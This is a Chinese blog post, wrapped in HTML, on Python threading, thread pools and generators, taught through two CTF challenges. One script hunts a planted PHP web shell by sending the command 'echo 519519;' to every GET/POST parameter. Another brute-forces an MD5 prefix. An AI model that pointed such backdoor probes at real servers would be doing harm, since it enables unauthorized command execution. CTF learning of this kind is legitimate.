@@ -1,0 +1,554 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Python编程—多线程与迭代器 | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1711466907097">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Python编程—多线程与迭代器 | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="简单的编程练习。
+背景知识
+用简单的例子快速了解Python的多线程以及迭代器
+多线程
+下面是一个简单的多线程的例子：
+import threading
+
+def print_numbers():
+    for i in range(10..." />
+    <meta name="keywords" content="Python,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1711466907097" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    sky, blue and ...
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://skyblu3519.github.io/post/you-lian" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Python编程—多线程与迭代器
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-06-12
+              </span>
+              <span>
+                13 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/c6PC98FOD/" class="post-tag">
+                  # Python
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/python-bian-cheng-duo-xian-cheng-duo-jin-cheng-anddie-dai-qi-sheng-cheng-qi.jpeg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>简单的编程练习。</p>
+<h1 id="背景知识">背景知识</h1>
+<p>用简单的例子快速了解Python的多线程以及迭代器</p>
+<h2 id="多线程">多线程</h2>
+<p>下面是一个简单的多线程的例子：</p>
+<pre><code class="language-python">import threading
+
+def print_numbers():
+    for i in range(10):
+        print(i)
+
+def print_letters():
+    for letter in &quot;abcdefghijklmnopqrstuvwxyz&quot;:
+        print(letter)
+
+thread1 = threading.Thread(target=print_numbers)
+thread2 = threading.Thread(target=print_letters)
+
+thread1.start()
+thread2.start()
+
+thread1.join()
+thread2.join()
+</code></pre>
+<p>上述代码做了以下几件事：</p>
+<ul>
+<li>定义了两个函数，一个打印0到9的数字，另一个打印字母a到z。</li>
+<li>创建了两个线程，分别将两个函数作为目标（target）。</li>
+<li>通过<code>start()</code>将设置线程为“启动”状态，并且Python解释器将安排其执行。</li>
+<li><code>join()</code>方法用于等待一个特定的线程完成。当你在主线程中调用<code>thread1.join()</code>时，主线程将暂停执行，直到<code>thread1</code>完成。然后，你调用<code>thread2.join()</code>，主线程再次暂停，等待<code>thread2</code>完成。</li>
+</ul>
+<h2 id="迭代器">迭代器</h2>
+<p>下面是一个简单的迭代器例子：</p>
+<pre><code class="language-python">class Counter:
+    def __init__(self, low, high):
+        self.current = low
+        self.high = high
+
+    def __iter__(self):
+        # 返回迭代器对象本身
+        return self
+
+    def __next__(self):
+        # 返回容器的下一个值
+        if self.current &gt; self.high:
+            raise StopIteration
+        else:
+            self.current += 1
+            return self.current - 1
+
+counter = Counter(0, 5)
+for number in counter:
+    print(number)
+</code></pre>
+<p>在Python中，迭代器是一个实现了迭代器协议（包含<code>__iter__()</code>和<code>__next__()</code>方法）的对象。</p>
+<p>其中，<code>__iter__()</code>方法返回迭代器对象本身，然后在迭代的时候，每一次都会通过迭代器对象的<code>__next__()</code>方法给出一个值。</p>
+<p>当容器中没有更多的元素时，<code>__next__()</code>方法应该抛出StopIteration异常。Python会自动捕获这个异常，并停止迭代。</p>
+<p>接下来通过两道题目加深这两部分的理解。</p>
+<h1 id="强网杯-2019高明的黑客">[强网杯 2019]高明的黑客</h1>
+<p>下载源码www.tar.gz<br>
+<img src="https://skyblu3519.github.io/post-images/1686586610611.png" alt="" loading="lazy"></p>
+<p>源码里是一些混淆过的php文件，黑客留下的shell就在其中。</p>
+<p>对于一个文件，可以将其中所有GET和POST请求的参数提取出来，再把这些参数赋上命令（如<code>echo 519519;</code>）去请求。验证返回页面的内容，最后找到这个shell的参数。</p>
+<p>下面是一个简单的搜索脚本：</p>
+<pre><code class="language-python">import os
+import re
+import requests
+import threading
+import concurrent.futures
+import itertools
+import time
+
+
+def find_backdoor_iteration(filename):
+    with open(path + filename) as f:
+        php_code = f.read()
+
+    pattern = r&quot;\$_(GET|POST)\['(\w+)'\]&quot;
+    matches = re.findall(pattern, php_code)
+    parameters = {'GET': [], 'POST': []}
+    for match in matches:
+        param_type = match[0]
+        param_name = match[1]
+        parameters[param_type].append(param_name)
+
+    params = {key: command for key in parameters['GET']}
+    data = {key: command for key in parameters['POST']}
+    resp = requests.post(url+filename, params=params, data=data)
+
+    if '519519' in resp.text:
+        print('Find backdoor: '+filename)
+        # 寻找正确的参数
+        method = ''
+        resp = requests.get(url + filename, params=params)
+        if '519519' in resp.text:
+            print('Backdoor in GET!!!')
+            method = 'GET'
+        resp = requests.post(url + filename, data=data)
+        if '519519' in resp.text:
+            print('Backdoor in POST!!!')
+            method = 'POST'
+
+        keys = parameters[method]
+        for key in keys:
+            message = {key: command}
+            resp = requests.get(url + filename, params=message) if method == 'GET' else requests.post(url + filename, data=message)
+            if '519519' in resp.text:
+                print('Backdoor is ' + key)
+                return True
+    return False
+
+
+query = 'buu/smartHacker/'
+path = '/Applications/MAMP/htdocs/' + query     # 保存文件的路径
+fileList = os.scandir(path)
+command = &quot;echo 519519;&quot;
+url = 'http://localhost:8888/' + query      # 请求的URL
+
+for file in fileList:
+    filename = file.name
+    if find_backdoor_iteration(filename):
+        break
+</code></pre>
+<p>实现搜索后门的函数<code>find_backdoor_iteration</code>实现逻辑如下：</p>
+<ul>
+<li>接受一个文件名作为参数。</li>
+<li>读取这个文件的内容。</li>
+<li>将其中的GET和POST参数名称通过正则表达式匹配出来，按请求的方式存到一个字典中。</li>
+<li>将所有参数用我们的命令赋值并请求网页，验证是否存在后门。</li>
+<li>如果存在后门，则继续验证存在后门的参数是哪一个。</li>
+<li>对GET和POST的参数分别验证，找到最后的后门。</li>
+</ul>
+<p>Ps.</p>
+<ul>
+<li>这里留的后门是<code>system</code>的，在一开始不知道是<code>eval</code>还是<code>system</code>的情况下，用<code>echo 519519;</code>验证，这两种情况均可找到后门。</li>
+<li><code>requests.get(url, params=params)</code>使用<code>params=params</code>传递get请求的参数，会自动进行url编码。如果自己对payload进行url编码的话，就会导致二次编码，进而无法验证。</li>
+</ul>
+<p>最后我们会找到存在后门的页面是<code>xk0SzyKwfzw.php</code>，参数为GET请求的<code>Efa5BVG</code>。</p>
+<p>整个搜索的文件数量为3000，讲道理这个量不是很大，用迭代做也行了。不过用多线程还可以做得更好。</p>
+<p>下面来考虑用多线程对这一过程加速，这是我一开始想到的方案：</p>
+<pre><code class="language-python">tl = []
+for file in fileList:
+    filename = file.name
+    t = threading.Thread(target=find_backdoor, args=(filename,))
+    tl.append(t)
+    t.start()
+for t in tl:
+    t.join()
+</code></pre>
+<p>非常的粗暴，没有控制线程的数量，这可能会消耗很多资源。为了解决这个问题，我们引入<strong>线程池</strong>的方法。</p>
+<p>下面是用线程池对原方案的改进：</p>
+<pre><code class="language-python">import concurrent.futures
+
+with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+    executor.map(find_backdoor_iteration, (file.name for file in fileList))
+</code></pre>
+<p>在这个代码中，<code>with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:</code>这行代码创建了一个包含10个线程的线程池。</p>
+<p>然后，<code>executor.map(find_backdoor_iteration, (file.name for file in fileList))</code>这行代码将<code>find_backdoor_iteration</code>函数应用到由<code>(file.name for file in fileList)</code>这个生成器表达式生成的每个元素。</p>
+<p><code>map</code>函数会自动将任务分配给线程池中的线程，如果线程池已经满了，那么新的任务就会等待，直到有线程空闲。</p>
+<p><code>with</code>语句保证了当所有任务都完成后，线程池会被正确地关闭，所有的资源都会被正确地回收。这比手动创建和回收线程要简单得多。</p>
+<p>接下来还有一个问题，这个搜索过程会将这3000个文件全部遍历，而我希望它在找到后门后可以让程序直接停止。</p>
+<p>解决的方案是使用一个全局的<code>Event</code>对象来对进程进行控制，当调用<code>Event.set()</code>时，<code>Event.is_set()</code>会返回True，当调用<code>Event.clear()</code>时，<code>Event.is_set()</code>会返回False。下面对原来的函数进行修改：</p>
+<pre><code class="language-python">import concurrent.futures
+import threading
+
+def find_backdoor_thread(filename):
+    if stop_event.is_set():
+        return
+    # 搜索代码......
+    if filename == 'backdoor':
+        stop_event.set()
+
+stop_event = threading.Event()
+with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+    executor.map(find_backdoor_thread, (file.name for file in fileList))
+</code></pre>
+<p>下面对比两种搜索方式所耗的时间：</p>
+<pre><code class="language-python">print('+---开始迭代搜索---+')
+start_time = time.time()
+for file in fileList:
+    filename = file.name
+    if find_backdoor_iteration(filename):
+        break
+end_time = time.time()
+print('迭代搜索的运行时间：', end_time - start_time, '秒')
+
+stop_event = threading.Event()
+fileList = os.scandir(path)
+print('+---开始多线程搜索---+')
+start_time = time.time()
+with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+    executor.map(find_backdoor_thread, (file.name for file in fileList))
+end_time = time.time()
+print('多线程搜索的运行时间：', end_time - start_time, '秒')
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1686591312419.png" alt="" loading="lazy"></figure>
+<p>可以看到使用多线程效率的提升还是非常显著的～</p>
+<h1 id="bjdctf2020easysearch">[BJDCTF2020]EasySearch</h1>
+<p>源码在index.php.swp<br>
+<img src="https://skyblu3519.github.io/post-images/1686592012870.png" alt="" loading="lazy"></p>
+<p>这里关注一下如何找到这样的password，使其md5后前6个字符为<code>6d0bc1</code>。</p>
+<p>思路很简单：</p>
+<ul>
+<li>写一个函数<code>generateString()</code>，用于生成指定字符集<code>charset</code>中所有长度为<code>length</code>的字符串的组合。</li>
+<li>写一个函数<code>md5()</code>用于计算字符串的md5值。</li>
+<li>匹配出前缀符合要求的字符串。</li>
+</ul>
+<pre><code class="language-python">import hashlib
+
+
+def generateString(charset, c, l):
+    if l == 0:
+        strList.append(c)
+        return c
+    else:
+        for char in charset:
+            generateString(charset, char + c, l - 1)
+
+
+def md5(string):
+    md5_hash = hashlib.md5()
+    md5_hash.update(string.encode('utf-8'))
+    md5_value = md5_hash.hexdigest()
+
+    return md5_value
+
+
+charset = '0123456789'
+length = 7
+strList = []
+generateString(charset, '', length)
+for s in strList:
+    if md5(s).startswith('6d0bc1'):
+        print('Find it: '+s)
+</code></pre>
+<p>同样，这个方法可以找到想要的字符串，但还可以做得更好。</p>
+<p>这里存在的一个问题是“在字符集过大或者长度需要更长的情况下，strList会变得非常重，存储这个列表会消耗很多内存，设置会有超出存储长度的情况出现。</p>
+<p>为了解决这样的问题，我们希望每一次生成的字符串只在需要的时候才开始计算，不用开始就全部计算存储好。这里我们引入迭代器，迭代器可以实现惰性求值（lazy evaluation），即只在真正需要计算元素的值时才计算。</p>
+<p>那么怎么把我们的递归函数引入到一个生成器中呢？像下面这样？</p>
+<pre><code class="language-python">class Counter:
+    def __init__(self, charset, length):
+        self.charset = charset
+        self.length = length
+
+    def __iter__(self):
+        return self
+
+    def __next__(self):
+        generateString(self.charset, '', self.length)
+        raise StopIteration
+</code></pre>
+<p>显然是不行的，<code>generateString</code>不会每一次返回一个字符串出来，而且它内部的迭代状态也不会被迭代器保存。仔细思考后就会发现，将函数直接放到迭代器这种方法是行不通的。</p>
+<p>这时我们引入Python生成器，生成器是Python中一种特殊的迭代器，只要一个函数有yield它就是一个生成器。当一次迭代执行到yield时候就会暂停返回yield后面的结果，然后下一次迭代的时候又从上一次yield暂停的地方继续运行。</p>
+<p>下面我们用生成器实现上面的效果：</p>
+<pre><code class="language-python">class CombinationGenerator:
+    def __init__(self, charset, length):
+        self.charset = charset
+        self.length = length
+
+    def __iter__(self):     # 用__iter__返回一个生成器。
+        return self.generateString(self.charset, '', self.length)
+
+    def generateString(self, charset, c, l):
+        if l == 0:
+            yield c
+        else:
+            for char in charset:
+                yield from self.generateString(charset, c + char, l - 1)
+</code></pre>
+<p>注意这里使用了<code>yield from</code>在生成器中更方便地处理嵌套的迭代。<code>yield from &lt;expression&gt;</code>的表达式部分必须是另一个可迭代对象，<code>yield from</code>会从这个迭代对象中获取值，并在每次迭代时<code>yield</code>这些值，这里<code>yield from</code>也起到一个递归调用的效果。</p>
+<p>下面是最后的代码：</p>
+<pre><code class="language-python">import hashlib
+import concurrent.futures
+
+
+class CombinationGenerator:
+    def __init__(self, charset, length):
+        self.charset = charset
+        self.length = length
+
+    def __iter__(self):
+        return self.generateString(self.charset, '', self.length)
+
+    def generateString(self, charset, c, l):
+        if l == 0:
+            yield c
+        else:
+            for char in charset:
+                yield from self.generateString(charset, c + char, l - 1)
+
+
+def md5(string):
+    md5_hash = hashlib.md5()
+    md5_hash.update(string.encode('utf-8'))
+    md5_value = md5_hash.hexdigest()
+
+    return md5_value
+
+
+if __name__ == '__main__':
+    combination_generator = CombinationGenerator('qwertyuiopasdfghjklzxcvbnm', 6)
+    
+    for combination in combination_generator:
+        result = md5(combination)
+        if result.startswith('6d0bc1'):
+            print('Find it: ' + combination)
+</code></pre>
+<p>同样<code>combination_generator</code>返回的是一个可迭代对象，这也方便我们使用到多线程中。我们可以像下面使用多线程来加速这一搜索过程.....吗？</p>
+<pre><code class="language-python">def ezSearch(string):
+    # print('Test: ' + string)
+    result = md5(string)
+    if result.startswith('6d0bc1'):
+        print('Find it: ' + string, flush=True)
+
+if __name__ == '__main__':
+    combination_generator = CombinationGenerator('qwertyuiopasdfghjklzxcvbnm', 6)
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+        executor.map(ezSearch, combination_generator)
+</code></pre>
+<p>经过测试后，我们发现这里使用多线程不但没有加速搜索，反而让时间变长了。这是由于Python的全局解释器锁（Global Interpreter Lock, GIL）造成的。</p>
+<p>在Python中，全局解释器锁是一种机制，用于同步多线程的执行，保证同一时间只有一个线程在执行。这种设计主要是为了防止多线程并发操作导致的数据不一致问题。但是，全局解释器锁也限制了Python的多线程并发性能：在CPU密集型任务中，Python的多线程甚至可能比单线程更慢。</p>
+<p>但是，在IO密集型任务中，例如文件读写、网络请求等，Python的多线程仍然可以带来显著的性能提升，因为这些任务的大部分时间都在等待IO操作，而非CPU计算。在等待IO的过程中，其他线程可以得到执行。</p>
+<p>所以，如果在做的是CPU密集型任务，例如计算MD5哈希，可能会发现多线程并没有带来性能提升，甚至变慢。在这种情况下，可以尝试使用多进程（例如使用<code>multiprocessing</code>模块），或者使用其他可以避开GIL限制的方法，例如使用Jython或者PyPy这样的Python实现，或者使用Cython这样的工具将关键代码编译为C代码。（ChatGPT🐂）</p>
+<p>下面在字符集数字，长度为7的情况下，我们比较一下这三种方法（迭代、多线程、多进程）所耗的时间：</p>
+<pre><code class="language-python">if __name__ == '__main__':
+    combination_generator = CombinationGenerator('0123456789', 7)
+    print('+---开始迭代搜索---+')
+    start_time = time.time()
+    for combination in combination_generator:
+        result = md5(combination)
+        if result.startswith('6d0bc1'):
+            print('Find it: ' + combination)
+    end_time = time.time()
+    print('迭代搜索时间：', end_time - start_time, '秒')
+
+    combination_generator = CombinationGenerator('0123456789', 7)
+    print('+---开始多线程搜索---+')
+    start_time = time.time()
+    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+        executor.map(ezSearch, combination_generator)
+    end_time = time.time()
+    print('多线程搜索的时间：', end_time - start_time, '秒')
+
+    combination_generator = CombinationGenerator('0123456789', 7)
+    print('+---开始多进程搜索---+')
+    start_time = time.time()
+    with multiprocessing.Pool(processes=10) as pool:
+        pool.map(ezSearch, combination_generator)
+    end_time = time.time()
+    print('多进程搜索的时间：', end_time - start_time, '秒')
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/1686598363282.png" alt="" loading="lazy"></figure>
+<h1 id="总结">总结</h1>
+<figure data-type="image" tabindex="3"><img src="https://skyblu3519.github.io/post-images/1686598179345.jpeg" alt="" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86">背景知识</a>
+<ul>
+<li><a href="#%E5%A4%9A%E7%BA%BF%E7%A8%8B">多线程</a></li>
+<li><a href="#%E8%BF%AD%E4%BB%A3%E5%99%A8">迭代器</a></li>
+</ul>
+</li>
+<li><a href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2">[强网杯 2019]高明的黑客</a></li>
+<li><a href="#bjdctf2020easysearch">[BJDCTF2020]EasySearch</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/2023-an-xun-bei-sai-hou-zong-jie-kuai-su-ban/">
+              <h3 class="post-title">
+                [2023SYCTF&#34;安洵杯&#34;]赛后总结（摆烂版）
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
